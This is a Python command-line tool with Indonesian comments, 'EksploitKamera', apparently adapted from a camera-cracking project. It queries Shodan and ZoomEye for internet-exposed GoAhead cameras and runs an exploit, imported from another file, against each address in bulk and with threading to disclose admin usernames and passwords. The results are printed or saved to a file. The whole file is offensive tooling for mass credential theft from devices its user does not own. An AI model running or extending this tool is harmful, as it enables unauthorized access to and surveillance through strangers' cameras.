import argparse
import os
import requests
import threading
from shodan import Shodan
from time import sleep as thread_delay

from .__main__ import EksploitKamera
from badges import Badges

### 1. Import Statements:

# import argparse
# import os
# import requests
# import threading
# from shodan import Shodan
# from time import sleep as thread_delay

# from .__main__ import EksploitKamera
# from badges import Badges

# - `argparse`: Modul ini digunakan untuk memproses argumen baris perintah yang diberikan saat menjalankan skrip.
# - `os`: Digunakan untuk berinteraksi dengan sistem operasi, seperti mengatur direktori kerja atau memeriksa keberadaan file.
# - `requests`: Modul ini digunakan untuk membuat permintaan HTTP, yang digunakan untuk mengakses data dari internet.
# - `threading`: Digunakan untuk membuat dan mengelola threading, yang memungkinkan eksekusi kode secara bersamaan.
# - `Shodan`: Ini adalah kelas dari modul `shodan`, yang memungkinkan akses ke layanan Shodan untuk memperoleh informasi tentang perangkat dan jaringan.
# - `thread_delay`: Digunakan untuk memberi jeda antar thread.
# - `EksploitKamera` dan `Badges`: Kelas-kelas yang diimpor dari file lain (`__main__.py` dan `badges.py`) yang akan digunakan dalam program.
# - `EksploitKameraCLI` adalah subclass dari `CamOver` dan `Badges`, yang menyediakan antarmuka baris perintah untuk alat `EksploitKamera`.

class EksploitKameraCLI(EksploitKamera, Badges):
    """ Subkelas modul eksploitkamera.

    Subkelas modul eksploitkamera ini dimaksudkan untuk menyediakan
    Antarmuka baris perintah untuk eksploitkamera.
    """

    def __init__(self) -> None:
        super().__init__()

        self.thread_delay = 0.1

        self.description = (
            'EksploitKamera adalah alat eksploitasi kamera yang memungkinkan untuk'
            ' Pengungkapan kata sandi admin kamera jaringan.'
        )

        self.parser = argparse.ArgumentParser(description=self.description)
        self.parser.add_argument('-t', '--threads', dest='threads', action='store_true', help='Gunakan threads untuk pekerjaan cepat')
        self.parser.add_argument('-o', '--output', dest='output', help='Output Hasil untuk file.')
        self.parser.add_argument('-i', '--input', dest='input', help='Input file alamat.')
        self.parser.add_argument('-a', '--address', dest='address', help='Satu alamat.')
        self.parser.add_argument('--shodan', dest='shodan', help='Kunci API Shodan untuk mengeksploitasi perangkat melalui Internet.')
        self.parser.add_argument('--zoomeye', dest='zoomeye', help='Kunci API ZoomEye untuk mengeksploitasi perangkat melalui Internet.')
        self.parser.add_argument('-p', '--pages', dest='pages', type=int, help='Jumlah halaman yang ingin Anda dapatkan dari ZoomEye.')
        self.args = self.parser.parse_args()

    def thread(self, address: str) -> bool:
        """ Mulai thread baru untuk alamat yang ditentukan.

        :param STR Address: Alamat Perangkat
        :return bool: Benar jika thread berhasil
        """

        result = self.exploit(address)

        if result:
            result = f"({address}) - {result[0]}:{result[1]}"
            if not self.args.output:
                self.print_success(result)
            else:
                with open(self.args.output, 'a') as f:
                    f.write(f"{result}\n")
            return True
        return False

    def crack(self, addresses: list) -> None:
        """ Retak semua perangkat dari daftar yang ditentukan.

        :param list addresses: daftar alamat perangkat
        :return Tidak ada: Tidak ada
        """

        line = "/-\\|"

        counter = 0
        threads = list()
        for address in addresses:
            if counter >= len(line):
                counter = 0
            self.print_process(f"Mengeksploitasi... ({address}) {line[counter]}", end='')

            if not self.args.threads:
                self.thread(address)
            else:
                thread_delay(self.thread_delay)
                thread = threading.Thread(target=self.thread, args=[address])

                thread.start()
                threads.append(thread)
            counter += 1

        counter = 0
        for thread in threads:
            if counter >= len(line):
                counter = 0
            self.print_process(f"Membersihkan... {line[counter]}", end='')

            if thread.is_alive():
                thread.join()
            counter += 1

    def start(self) -> None:
        """ Pengendali argumen baris perintah utama.

        :return Tidak ada: Tidak ada
        """

        if self.args.output:
            directory = os.path.split(self.args.output)[0]

            if directory:
                if not os.path.isdir(directory):
                    self.print_error(f"Direktori: {directory}: tidak ada!")
                    return

        if self.args.zoomeye:
            self.print_process("Mengotorisasi ZoomEye dengan memberikan kunci API...")
            try:
                zoomeye = 'https://api.zoomeye.org/host/search?query=GoAhead 5ccc069c403ebaf9f0171e9517f40e41&page='
                zoomeye_header = {
                    'Authorization': f'JWT {self.zoomeye}'
                }
                addresses = list()

                if self.args.pages:
                    pages = int(self.args.pages)
                else:
                    pages = 100
                pages, page = divmod(pages, 20)
                if page != 0:
                    pages += 1

                for page in range(1, pages + 1):
                    results = requests.get(zoomeye + str(page), headers=zoomeye_header).json()
                    if not len(results['matches']):
                        self.print_error("Gagal mengotorisasi ZoomEye!")
                        return
                    for address in results['matches']:
                        addresses.append(address['ip'] + ':' + str(address['portinfo']['port']))
            except Exception:
                self.print_error("Gagal mengotorisasi ZoomEye!")
                return
            self.crack(addresses)

        elif self.args.shodan:
            self.print_process("Mengotorisasi Shodan dengan memberikan kunci API...")
            try:
                shodan = Shodan(self.args.shodan)
                results = shodan.search(query='GoAhead 5ccc069c403ebaf9f0171e9517f40e41')
                addresses = list()
                for result in results['matches']:
                    addresses.append(result['ip_str'] + ':' + str(result['port']))
            except Exception:
                self.print_error("Gagal mengotorisasi Shodan!")
                return
            self.print_success("Otorisasi berhasil diselesaikan!")
            self.crack(addresses)

        elif self.args.input:
            if not os.path.exists(self.args.input):
                self.print_error(f"Input file: {self.args.input}: tidak ada!")
                return

            with open(self.args.input, 'r') as f:
                addresses = f.read().strip().split('\n')
                self.crack(addresses)

        elif self.args.address:
            self.print_process(f"Mengeksploitasi {self.args.address}...")
            if not self.thread(self.args.address):
                self.print_error(f"({self.args.address}) - tidak rentan!")

        else:
            self.parser.print_help()
            return
        self.print_empty(end='')
### 2. Kelas `CamOverCLI`:
# - `EksploitKameraCLI` adalah subclass dari `EksploitKamera` dan `Badges`, yang menyediakan antarmuka baris perintah untuk alat `EksploitKamera`.
# - Metode `__init__`: Inisialisasi objek, mengatur deskripsi program dan argumen baris perintah menggunakan modul `argparse`.
# - Metode `thread`: Memulai thread baru untuk mengeksploitasi alamat yang ditentukan.
# - Metode `crack`: Melakukan pemindaian dan pemecahan sandi untuk semua alamat yang diberikan.
# - Metode `start`: Menangani argumen baris perintah utama dan memulai proses eksploitasi.


def main() -> None:
    """ Antarmuka baris perintah EksploitKamera.

    :return Tidak ada: Tidak ada
    """

    try:
        cli = EksploitKameraCLI()
        cli.start()
    except BaseException:
        pass

### 3. Fungsi `main`:
# - `main` adalah fungsi utama yang memulai eksekusi program.
# - Ini menciptakan instance dari `EksploitKameraCLI` dan memulai proses eksploitasi dengan memanggil metode `start`.


# =========================================================================================== 

# Baik, saya akan memberikan penjelasan lebih detail untuk setiap bagian kode dan alur program:

### Alur Kerja Program:
# 1. **Pemrosesan Argumen**: Program mengurai dan memproses argumen baris perintah yang diberikan.
# 2. **Menjalankan Tindakan**: Berdasarkan argumen yang diberikan, program akan memilih tindakan yang sesuai untuk dilakukan. Ini bisa berupa pemindaian melalui ZoomEye atau Shodan, atau pemindaian dari file atau alamat langsung.
# 3. **Eksploitasi**: Untuk setiap alamat yang dipindai, program akan mulai eksploitasi, baik secara serial maupun dengan menggunakan threading untuk meningkatkan kecepatan.
# 4. **Penanganan Hasil**: Hasil pemindaian dapat ditampilkan di layar atau disimpan ke dalam file, tergantung pada opsi yang diberikan pada argumen baris perintah.

